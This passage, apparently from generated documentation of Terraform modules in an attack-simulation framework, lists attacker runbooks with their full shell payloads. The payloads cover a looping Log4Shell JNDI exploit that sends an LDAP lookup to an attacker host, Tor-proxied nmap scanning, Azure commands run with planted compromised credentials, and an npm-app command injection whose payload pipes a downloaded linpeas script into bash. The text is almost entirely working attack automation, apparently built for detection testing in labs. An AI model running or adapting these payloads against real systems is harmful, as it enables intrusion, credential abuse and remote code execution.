&quot;jndi\.base64&quot; \|\| \! \-f &quot;JNDIExploit\-1\.2\-SNAPSHOT\.jar&quot; \]\]; then<br/>        rm \-f jndi\.base64 \*\.zip JNDIExploit\-\*\.jar<br/>        wget https://github\.com/credibleforce/jndi/raw/main/jndi\.base64<br/>        base64 \-d jndi\.base64 &gt; JNDIExploit\.1\.2\.zip<br/>        unzip \-o JNDIExploit\.\*\.zip<br/>        rm \*\.zip<br/>    fi<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;setting up jndiexploit in screen session\.\.\.&quot;<br/>        if pgrep \-f &quot;JNDIExploit&quot;; then<br/>            kill \-9 $\(pgrep \-f &quot;JNDIExploit&quot;\)<br/>        fi<br/>        JNDIEXPLOIT\_LOG=&quot;/tmp/jndiexploit\.log&quot;<br/>        for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$JNDIEXPLOIT\_LOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>        mv $JNDIEXPLOIT\_LOG &quot;$JNDIEXPLOIT\_LOG\.1&quot; 2&gt;/dev/null \|\| true<br/>        screen \-S jndiexploit \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile $JNDIEXPLOIT\_LOG \-S jndiexploit \-m java \-jar JNDIExploit\-\*\.jar \-\-ip $ATTACKER\_IP \-\-httpPort 8088 \-\-ldapPort 1389<br/>        screen \-S jndiexploit \-X colon &quot;logfile flush 0^M&quot;<br/><br/>        log &quot;sleeping 15 minutes\.\.\.&quot;<br/>        sleep 900<br/>        log &quot;start services availability check\.\.\.&quot;<br/><br/>        log &quot;checking target: $TARGET\_IP:$TARGET\_PORT&quot;<br/>        while \! nc \-z \-w 5 \-vv $TARGET\_IP $TARGET\_PORT &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for target: $TARGET\_IP:$TARGET\_PORT&quot;;<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                break<br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;target available&quot;;<br/>        log &quot;checking attacker ldap: $ATTACKER\_IP:$ATTACKER\_LDAP\_PORT&quot;<br/>        while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $ATTACKER\_LDAP\_PORT &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for attacker ldap: $ATTACKER\_IP:$ATTACKER\_LDAP\_PORT&quot;;<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                break<br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker ldap available&quot;;<br/>        log &quot;checking attacker http: $ATTACKER\_IP:$ATTACKER\_HTTP\_PORT&quot;<br/>        while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $ATTACKER\_HTTP\_PORT &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for attacker http: $ATTACKER\_IP:$ATTACKER\_HTTP\_PORT&quot;;<br/>            sleep 30;<br/>            if \! screen \-ls \| grep jndiexploit; then<br/>                log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                <br/>            fi<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;attacker http available&quot;;<br/>        if \[ &quot;0&quot; \!= &quot;$REVERSE\_SHELL\_PORT&quot; \]; then<br/>            log &quot;checking attacker reverse shell: $ATTACKER\_IP:$REVERSE\_SHELL\_PORT&quot;<br/>            while \! nc \-z \-w 5 \-vv $ATTACKER\_IP $REVERSE\_SHELL\_PORT &gt; /dev/null; do<br/>                log &quot;failed check \- waiting for attacker reverse shell: $ATTACKER\_IP:$REVERSE\_SHELL\_PORT&quot;;<br/>                sleep 30;<br/>                if \! screen \-ls \| grep jndiexploit; then<br/>                    log &quot;screen session no longer running\.\.\.reset required&quot;<br/>                fi<br/>                if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                    log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                    rm \-f /tmp/payload\_$SCRIPTNAME<br/>                    break 2<br/>                fi<br/>            done;<br/>            log &quot;attacker reverse shell available&quot;;<br/>        fi<br/>        sleep 30;<br/>        if \! screen \-ls \| grep jndiexploit; then<br/>            log &quot;screen session no longer running\.\.\.reset required&quot;<br/>            break<br/>        fi<br/>        log &quot;sending payload: curl \-\-verbose $TARGET\_IP:$TARGET\_PORT \-H &#x27;X\-Api\-Version: \\$$\{jndi:ldap://$ATTACKER\_IP:$ATTACKER\_LDAP\_PORT/$EXEC\_TYPE/$BASE64\_PAYLOAD\}&#x27;&quot;<br/>        /bin/bash \-c &quot;curl \-\-verbose $TARGET\_IP:$TARGET\_PORT \-H &#x27;X\-Api\-Version: \\$$\{jndi:ldap://$ATTACKER\_IP:$ATTACKER\_LDAP\_PORT/$EXEC\_TYPE/$BASE64\_PAYLOAD\}&#x27;&quot;<br/>        log &quot;done&quot;;<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;git openjdk\-11\-jdk unzip&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;git java\-11\-openjdk java\-11\-openjdk\-devel unzip&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                          |
| attacker-runbook-execute-docker-nmap                     | ./modules/runbook/execute-docker-nmap                | runbook_exec_docker_nmap_attacker                | context.azure.runbook.attacker.execute.docker_nmap                | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;docker_nmap&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;ports&quot;: [<br/>                                22,<br/>                                80,<br/>                                443,<br/>                                1433,<br/>                                3306,<br/>                                5000,<br/>                                5432,<br/>                                5900,<br/>                                6379,<br/>                                8000,<br/>                                8080,<br/>                                8088,<br/>                                8090,<br/>                                8091,<br/>                                9200,<br/>                                27017<br/>                            ],<br/>                            &quot;scan_local_network&quot;: false,<br/>                            &quot;targets&quot;: [],<br/>                            &quot;use_tor&quot;: true<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre> | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-nmap                | <pre>locals \{<br/>    attack\_dir = &quot;/nmap&quot;<br/>    attack\_script = &quot;nmap\.sh&quot;<br/>    start\_script = &quot;delayed\_start\.sh&quot;<br/>    lock\_file = &quot;/tmp/delay\_nmap\.lock&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk &#x27;/scope global/ \{print $4\}&#x27; \| head \-1\)<br/>        log &quot;LOCAL\_NET: $LOCAL\_NET&quot;<br/>        log &quot;Targets: $\{join\(&quot;,&quot;, var\.inputs\[&quot;targets&quot;\]\)\}&quot;<br/>        echo &quot;$\{ length\(var\.inputs\[&quot;targets&quot;\]\) &gt; 0 ? join\(&quot;\\n&quot;, var\.inputs\[&quot;targets&quot;\]\) : &quot;$LOCAL\_NET&quot; \}&quot; &gt; /tmp/nmap\-targets\.txt<br/>        log &quot;Ports: $\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\}&quot;<br/>        if docker ps \-a \| grep $\{var\.inputs\[&quot;container\_name&quot;\]\}; then <br/>            docker stop $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>            docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        fi<br/>        $\{ var\.inputs\[&quot;use\_tor&quot;\] == true ? &lt;&lt;\-EOF<br/>        log &quot;Using tor network\.\.\.&quot;<br/>        if \! docker ps \| grep torproxy &gt; /dev/null; then<br/>        docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f &#x27;\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}&#x27; torproxy\)<br/>        log &quot;Running via docker: proxychains nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt&quot;<br/>        /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} nmap \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true&quot; <br/>        /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        : &lt;&lt;\-EOF<br/>        log &quot;Running via docker: nmap \-Pn \-sS \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt&quot;<br/>        /bin/bash \-c &quot;docker run \-\-rm \-v /tmp:/tmp \-\-entrypoint=nmap \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} \-Pn \-sT \-T2 \-oX /tmp/scan\.xml \-p$\{join\(&quot;,&quot;, var\.inputs\[&quot;ports&quot;\]\)\} \-iL /tmp/nmap\-targets\.txt \|\| true&quot;<br/>        /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        EOF<br/>        \}<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| attacker-runbook-execute-generate-azure-cli-traffic      | ./modules/runbook/execute-generate-azure-cli-traffic | runbook_exec_generate_azure_cli_traffic_attacker | context.azure.runbook.attacker.execute.generate_azure_cli_traffic | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;generate_azure_cli_traffic&quot;: {<br/>                            &quot;commands&quot;: [],<br/>                            &quot;compromised_credentials&quot;: {},<br/>                            &quot;compromised_keys_user&quot;: null,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;profile&quot;: &quot;azure-traffic&quot;<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-generate-azure-cli-traffic | <pre>locals \{<br/>    tool = &quot;az&quot;<br/>    attack\_dir = &quot;/generate\-azure\-cli\-traffic&quot;<br/>    azure\_creds = var\.inputs\[&quot;compromised\_credentials&quot;\]\[var\.inputs\[&quot;compromised\_keys\_user&quot;\]\]\.rendered<br/>    azure\_commands = join\(&quot;\\n&quot;, \[ for command in var\.inputs\[&quot;commands&quot;\]: &quot;$\{command\}&quot; \]\)<br/><br/>    payload = &lt;&lt;\-EOT<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    log &quot;Deploying azure credentials\.\.\.&quot;<br/>    mkdir \-p ~/\.azure<br/>    if \[  &quot;$\{ local\.azure\_creds == &quot;&quot; ? &quot;false&quot; : &quot;true&quot; \}&quot; == &quot;true&quot; \]; then<br/>      echo $\{base64gzip\(local\.azure\_creds\)\} \| base64 \-d \| gunzip &gt; ~/\.azure/my\.azureauth<br/>      export AZURE\_AUTH\_LOCATION=~/\.azure/my\.azureauth<br/>    fi<br/>    log &quot;Running azure commands\.\.\.&quot;<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        $\{local\.azure\_commands\}<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        while \! command \-v $\{local\.tool\} &gt; /dev/null; do<br/>            log &quot;$\{local\.tool\} not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| attacker-runbook-execute-exploit-npm-app                 | ./modules/runbook/execute-exploit-npm-app            | runbook_exec_exploit_npm_app                     | context.azure.runbook.attacker.execute.exploit_npm_app            | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;execute&quot;: {<br/>                        &quot;exploit_npm_app&quot;: {<br/>                            &quot;attack_delay&quot;: 50400,<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;payload&quot;: &quot;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files&quot;,<br/>                            &quot;target_ip&quot;: null,<br/>                            &quot;target_port&quot;: 8089<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-exploit-npm-app            | <pre>locals \{<br/>    attack\_dir = &quot;/npm\_attack&quot;<br/>    target\_ip=var\.inputs\[&quot;target\_ip&quot;\]<br/>    target\_port=var\.inputs\[&quot;target\_port&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        log &quot;payload: curl \-\-get \-\-verbose \\&quot;http://$\{local\.target\_ip\}:$\{local\.target\_port\}/api/getServices\\&quot; \-\-data\-urlencode &#x27;name\[\]=\\$\($\{var\.inputs\[&quot;payload&quot;\]\}\)&#x27;&quot;<br/>        log &quot;checking target: $\{local\.target\_ip\}:$\{local\.target\_port\}&quot;<br/>        while \! nc \-z \-w 5 \-vv $\{local\.target\_ip\} $\{local\.target\_port\} &gt; /dev/null; do<br/>            log &quot;failed check \- waiting for target: $\{local\.target\_ip\}:$\{local\.target\_port\}&quot;;<br/>            sleep 30;<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break 2<br/>            fi<br/>        done;<br/>        log &quot;target available \- sending payload&quot;;<br/>        sleep 5;<br/>        curl \-\-get \-\-verbose &quot;http://$\{local\.target\_ip\}:$\{local\.target\_port\}/api/getServices&quot; \-\-data\-urlencode &#x27;name\[\]=$\($\{var\.inputs\[&quot;payload&quot;\]\}\)&#x27; &gt;&gt; $LOGFILE 2&gt;&amp;1;<br/>        echo &quot;\\n&quot; &gt;&gt; $LOGFILE<br/>        log &quot;payload sent sleeping\.\.\.&quot;<br/>        log &quot;done&quot;;<br/>        log &#x27;waiting 30 minutes\.\.\.&#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>            log &quot;waiting $\{var\.inputs\[&quot;attack\_delay&quot;\]\} seconds\.\.\.&quot;;<br/>            sleep $\{var\.inputs\[&quot;attack\_delay&quot;\]\}<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = var\.inputs\[&quot;attack\_delay&quot;\]<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| attacker-runbook-listener-http-listener                  | ./modules/runbook/listener-http-listener             | runbook_exec_responder_http_listener             | context.azure.runbook.attacker.listener.http                      | <pre>{<br/>    &quot;context&quot;: {<br/>        &quot;azure&quot;: {<br/>            &quot;runbook&quot;: {<br/>                &quot;attacker&quot;: {<br/>                    &quot;listener&quot;: {<br/>                        &quot;http&quot;: {<br/>                            &quot;enabled&quot;: false,<br/>                            &quot;listen_ip&quot;: &quot;0.0.0.0&quot;,<br/>                            &quot;listen_port&quot;: 8080<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/listener-http-listener             | <pre>locals \{<br/>    listen\_port = var\.inputs\[&quot;listen\_port&quot;\]<br/>    listen\_ip = var\.inputs\[&quot;listen\_ip&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    mkdir \-p /tmp/www/<br/>    echo &quot;index&quot; &gt; /tmp/www/index\.html<br/>    mkdir \-p /tmp/www/upload/v2<br/>    echo &quot;upload&quot; &gt; /tmp/www/upload/v2/index\.html<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &#x27;\{ print $1 \}&#x27;\)<br/>    while true; do<br/>        log &quot;listener: $\{local\.listen\_ip\}:$\{local\.listen\_port\}&quot;<br/>        screen \-S http \-X quit<br/>        screen \-wipe<br/>        APPLOG=/tmp/http\_$SCRIPTNAME\.log<br/>        for i in \`seq $\(\(MAXLOG\-1\)\) \-1 1\`; do mv &quot;$APPLOG\.&quot;\{$i,$\(\(i\+1\)\)\} 2&gt;/dev/null \|\| true; done<br/>        mv $APPLOG &quot;$APPLOG\.1&quot; 2&gt;/dev/null \|\| true<br/>        screen \-d \-L \-Logfile /tmp/http\.log \-S http \-m python3 \-c &quot;import base64; exec\(base64\.b64decode\(&#x27;$\{base64encode\(local\.app\)\}&#x27;\)\)&quot;<br/>        screen \-S http \-X colon &quot;logfile flush 0^M&quot;<br/>        sleep 30<br/>        log &quot;check app url\.\.\.&quot;<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \| tee \-a $LOGFILE; do<br/>            log &quot;failed to connect to app url http://localhost:$\{var\.inputs\[&quot;listen\_port&quot;\]\} \- retrying&quot;<br/>            sleep 